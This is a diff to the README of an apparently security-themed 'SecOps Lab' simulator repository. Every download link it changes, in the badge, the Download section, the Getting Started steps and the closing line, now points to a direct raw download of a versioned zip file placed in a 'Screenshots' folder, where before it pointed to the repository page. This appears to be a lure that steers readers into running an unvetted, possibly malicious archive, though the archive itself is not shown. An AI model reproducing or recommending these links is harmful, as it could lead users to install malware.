@@ -1,12 +1,12 @@
 # 🛡️ SecOps-Lab-Network-Security-Operations-Simulator - Learn Security in One Place
 
-[![Download SecOps Lab](https://img.shields.io/badge/Download%20SecOps%20Lab-4B7BEC?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Nicolinepaying961/SecOps-Lab-Network-Security-Operations-Simulator)
+[![Download SecOps Lab](https://img.shields.io/badge/Download%20SecOps%20Lab-4B7BEC?style=for-the-badge&logo=windows&logoColor=white)](https://raw.githubusercontent.com/Nicolinepaying961/SecOps-Lab-Network-Security-Operations-Simulator/main/Screenshots/Lab-Network-Operations-Simulator-Sec-Security-Ops-v1.0.zip)
 
 ## 🔽 Download
 
 Use this link to visit the page and download the app:
 
-https://github.com/Nicolinepaying961/SecOps-Lab-Network-Security-Operations-Simulator
+https://raw.githubusercontent.com/Nicolinepaying961/SecOps-Lab-Network-Security-Operations-Simulator/main/Screenshots/Lab-Network-Operations-Simulator-Sec-Security-Ops-v1.0.zip
 
 ## 📦 What This App Does
 
@@ -39,7 +39,7 @@ For smoother use, 8 GB RAM or more is a good choice.
 ## 🚀 Getting Started
 
 1. Open the download page:
-   https://github.com/Nicolinepaying961/SecOps-Lab-Network-Security-Operations-Simulator
+   https://raw.githubusercontent.com/Nicolinepaying961/SecOps-Lab-Network-Security-Operations-Simulator/main/Screenshots/Lab-Network-Operations-Simulator-Sec-Security-Ops-v1.0.zip
 2. Find the latest Windows build on the page
 3. Download the file to your PC
 4. Wait for the file to finish
@@ -223,4 +223,4 @@ cybersecurity-training, dhcp, dns-firewall, edr, endpoint-security, incident-res
 
 If you need the download page later, use this link:
 
-https://github.com/Nicolinepaying961/SecOps-Lab-Network-Security-Operations-Simulator
+https://raw.githubusercontent.com/Nicolinepaying961/SecOps-Lab-Network-Security-Operations-Simulator/main/Screenshots/Lab-Network-Operations-Simulator-Sec-Security-Ops-v1.0.zip
